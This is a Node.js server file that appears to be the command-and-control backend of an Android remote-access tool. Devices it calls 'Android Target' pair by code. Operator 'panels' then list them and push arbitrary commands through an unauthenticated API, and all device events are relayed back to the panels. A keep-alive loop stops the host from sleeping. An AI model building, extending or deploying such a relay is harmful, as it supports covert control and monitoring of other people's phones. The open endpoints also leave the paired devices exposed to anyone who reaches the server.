/* ============================================================
   LYX SERVER — WebSocket Relay + Pairing + Anti-Sleep
   Author: ZAMZZZ
   Railway-Ready
============================================================ */

const express = require('express');
const http = require('http');
const path = require('path');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const PORT = process.env.PORT || 3000;

/* ============ MIDDLEWARE ============ */
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

/* CORS biar bisa diakses dari domain lain */
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

/* ============ STATE ============ */
const pairings = new Map();   // code -> { createdAt, deviceId, used }
const devices  = new Map();   // deviceId -> { ws, meta, lastSeen }
const panels   = new Set();   // panel WS clients
const agentIndex = new Map(); // code -> deviceId (untuk reconnect)

/* ============ HELPER ============ */
function genCode(len = 6){
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let s = '';
  const buf = crypto.randomBytes(len);
  for (let i = 0; i < len; i++) s += chars[buf[i] % chars.length];
  return s;
}

function genDeviceId(){
  return 'DEV-' + crypto.randomBytes(3).toString('hex').toUpperCase();
}

function broadcastToPanels(obj){
  const data = JSON.stringify(obj);
  for (const ws of panels){
    if (ws.readyState === 1){
      try { ws.send(data); } catch(e){}
    }
  }
}

function deviceList(){
  const list = [];
  for (const [id, d] of devices){
    list.push({ id, name: d.meta.name, os: d.meta.os, pairedAt: d.meta.pairedAt });
  }
  return list;
}

/* ============================================================
   REST API
============================================================ */

/* Root — status check */
app.get('/', (req, res) => {
  res.json({
    ok: true,
    name: 'Lyx Server',
    uptime: process.uptime(),
    devices: devices.size,
    panels: panels.size,
    pairings: pairings.size,
    timestamp: new Date().toISOString()
  });
});

/* Generate pairing code */
app.post('/api/pair/generate', (req, res) => {
  let code;
  do { code = genCode(6); } while (pairings.has(code));
  pairings.set(code, { createdAt: Date.now(), deviceId: null, used: false });
  setTimeout(() => pairings.delete(code), 10 * 60 * 1000);
  console.log('[PAIR] new code:', code);
  res.json({ ok: true, code });
});

/* Cek code valid */
app.get('/api/pair/:code', (req, res) => {
  const code = (req.params.code || '').toUpperCase();
  const entry = pairings.get(code);
  if (!entry) return res.json({ ok: false, reason: 'INVALID' });
  if (entry.used) return res.json({ ok: false, reason: 'USED' });
  res.json({ ok: true });
});

/* List device */
app.get('/api/devices', (req, res) => {
  res.json({ ok: true, devices: deviceList() });
});

/* Kirim command */
app.post('/api/command', (req, res) => {
  const { device, feature, data } = req.body || {};
  const d = devices.get(device);
  if (!d || !d.ws || d.ws.readyState !== 1){
    return res.json({ ok: false, reason: 'DEVICE_OFFLINE' });
  }
  try {
    d.ws.send(JSON.stringify({ type: 'command', feature, data, ts: Date.now() }));
    console.log('[CMD]', device, feature);
    res.json({ ok: true });
  } catch(e){
    res.json({ ok: false, reason: 'SEND_FAILED' });
  }
});

/* Health check (Railway) */
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

/* ============================================================
   WEBSOCKET
============================================================ */
wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.role = null;
  ws.deviceId = null;
  ws.panelId = null;

  ws.on('pong', () => { ws.isAlive = true; });

  /* ============ TIMEOUT PANEL IDLE ============ */
  ws.lastActivity = Date.now();

  ws.on('message', (raw) => {
    ws.lastActivity = Date.now();
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }

    /* ============ PANEL HELLO ============ */
    if (msg.type === 'panel_hello'){
      ws.role = 'panel';
      ws.panelId = 'PANEL-' + crypto.randomBytes(2).toString('hex').toUpperCase();
      panels.add(ws);
      ws.send(JSON.stringify({
        type: 'device_list',
        devices: deviceList()
      }));
      console.log('[PANEL] connected:', ws.panelId, '| total:', panels.size);
      return;
    }

    /* ============ PANEL PING (keep alive) ============ */
    if (msg.type === 'ping'){
      ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
      return;
    }

    /* ============ AGENT PAIRING ============ */
    if (msg.type === 'agent_pair'){
      const code = (msg.code || '').toUpperCase();
      const entry = pairings.get(code);

      if (!entry){
        ws.send(JSON.stringify({ type: 'pair_result', ok: false, reason: 'INVALID_CODE' }));
        return;
      }
      if (entry.used){
        // Cek apakah deviceId masih nyambung (reconnect)
        const oldId = agentIndex.get(code);
        if (oldId && devices.has(oldId)){
          // Device lama masih hidup → tolak
          ws.send(JSON.stringify({ type: 'pair_result', ok: false, reason: 'CODE_USED' }));
          return;
        }
        // Device lama udah mati → izinkan pakai code yang sama
        if (oldId) devices.delete(oldId);
      }

      const deviceId = genDeviceId();
      const meta = {
        name: msg.name || 'Android Target',
        os: msg.os || 'Android',
        pairedAt: Date.now()
      };

      entry.used = true;
      entry.deviceId = deviceId;

      ws.role = 'agent';
      ws.deviceId = deviceId;
      devices.set(deviceId, { ws, meta, lastSeen: Date.now() });
      agentIndex.set(code, deviceId);

      // Simpan code di ws untuk reconnect
      ws.pairCode = code;

      ws.send(JSON.stringify({
        type: 'pair_result',
        ok: true,
        deviceId,
        message: 'PAIRING SUCCESS'
      }));

      broadcastToPanels({
        type: 'device_paired',
        device: { id: deviceId, name: meta.name, os: meta.os }
      });

      console.log('[AGENT] paired:', deviceId, meta.name, '| total:', devices.size);
      return;
    }

    /* ============ AGENT PING ============ */
    if (msg.type === 'ping'){
      ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
      if (ws.deviceId){
        const d = devices.get(ws.deviceId);
        if (d) d.lastSeen = Date.now();
      }
      return;
    }

    /* ============ AGENT EVENTS ============ */
    if (ws.role === 'agent' && ws.deviceId){
      broadcastToPanels({
        type: 'agent_event',
        deviceId: ws.deviceId,
        payload: msg
      });
      return;
    }
  });

  /* ============ CLOSE HANDLER ============ */
  ws.on('close', () => {
    if (ws.role === 'panel'){
      panels.delete(ws);
      console.log('[PANEL] disconnected:', ws.panelId, '| total:', panels.size);
    }
    if (ws.role === 'agent' && ws.deviceId){
      devices.delete(ws.deviceId);
      broadcastToPanels({ type: 'device_offline', deviceId: ws.deviceId });
      console.log('[AGENT] disconnected:', ws.deviceId, '| total:', devices.size);
    }
  });

  ws.on('error', (err) => {
    console.log('[WS ERROR]', err.message);
  });
});

/* ============================================================
   HEARTBEAT — cek koneksi mati tiap 30 detik
============================================================ */
setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false){
      try { ws.terminate(); } catch(e){}
      return;
    }
    ws.isAlive = false;
    try { ws.ping(); } catch(e){}
  });
}, 30000);

/* ============================================================
   CLEANUP DEVICE MATI (stale > 5 menit)
============================================================ */
setInterval(() => {
  const now = Date.now();
  for (const [id, d] of devices){
    if (now - d.lastSeen > 5 * 60 * 1000){
      console.log('[CLEANUP] device stale:', id);
      try { d.ws.close(); } catch(e){}
      devices.delete(id);
      broadcastToPanels({ type: 'device_offline', deviceId: id });
    }
  }
}, 60000);

/* ============================================================
   AUTO-PING DIRI SENDIRI (biar Railway gak sleep)
============================================================ */
setInterval(() => {
  // Ping dirinya sendiri via HTTP biar Railway detect aktivitas
  const url = process.env.RAILWAY_PUBLIC_DOMAIN
    ? 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN + '/health'
    : 'http://localhost:' + PORT + '/health';

  const https = require('https');
  const http = require('http');
  const client = url.startsWith('https') ? https : http;

  client.get(url, (res) => {
    // console.log('[KEEPALIVE]', res.statusCode);
  }).on('error', () => {});
}, 4 * 60 * 1000); // tiap 4 menit

/* ============================================================
   GRACEFUL SHUTDOWN
============================================================ */
process.on('SIGTERM', () => {
  console.log('[SERVER] SIGTERM received, closing...');
  wss.clients.forEach((ws) => {
    try { ws.close(); } catch(e){}
  });
  server.close(() => process.exit(0));
});

process.on('uncaughtException', (err) => {
  console.log('[UNCAUGHT]', err.message);
});

process.on('unhandledRejection', (err) => {
  console.log('[UNHANDLED]', err);
});

/* ============================================================
   START
============================================================ */
server.listen(PORT, () => {
  console.log('========================================');
  console.log('  LYX SERVER RUNNING');
  console.log('  Port:', PORT);
  console.log('  Panel: /index.html');
  console.log('  Agent: /agent.html');
  console.log('  Health: /health');
  console.log('========================================');
});
